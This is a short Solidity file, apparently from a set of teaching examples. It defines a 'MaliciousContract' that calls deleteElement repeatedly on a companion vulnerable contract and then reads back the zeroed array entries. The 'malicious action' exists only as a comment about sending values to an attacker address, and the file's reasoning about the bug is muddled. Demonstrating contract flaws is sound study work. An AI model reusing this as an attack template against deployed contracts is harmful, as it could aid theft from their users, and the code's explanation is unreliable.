// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Array-deletion.sol";

contract MaliciousContract {
    ArrayDeletionBug public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = ArrayDeletionBug(_vulnerableContractAddress);
    }

    function exploitArrayDeletion() public {
        uint length = vulnerableContract.getLength();
        for (uint i = 0; i < length; i++) {
            vulnerableContract.deleteElement(0);
        }

        // Now the array still has the same length, but all elements are zeroed out
        // We can still access the "deleted" elements and perform malicious actions
        for (uint i = 0; i < length; i++) {
            uint element = vulnerableContract.myArray(i);
            // Perform malicious action with the retrieved element
            // For example, we could send the element value to an attacker-controlled address
            // or use it in some other malicious way
        }
    }
}